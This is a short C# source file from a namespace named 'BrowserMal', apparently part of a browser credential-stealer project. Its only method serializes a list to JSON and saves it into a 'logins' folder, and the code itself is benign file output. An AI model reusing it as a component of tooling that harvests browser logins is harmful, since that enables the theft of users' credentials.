using Newtonsoft.Json;
using System.Collections.Generic;
using System.Text;

namespace BrowserMal.Filesaver
{
    public class FileManager
    {
        public static void Save<T>(List<T> list, string outputPath)
        {
            //StringBuilder stringBuilder = new StringBuilder();
            string json = JsonConvert.SerializeObject(list, Formatting.Indented);

            /*foreach (T item in list)
                stringBuilder.AppendLine(item.ToString());*/

            System.IO.File.WriteAllText(@"logins\" + outputPath, json);
        }
    }
}
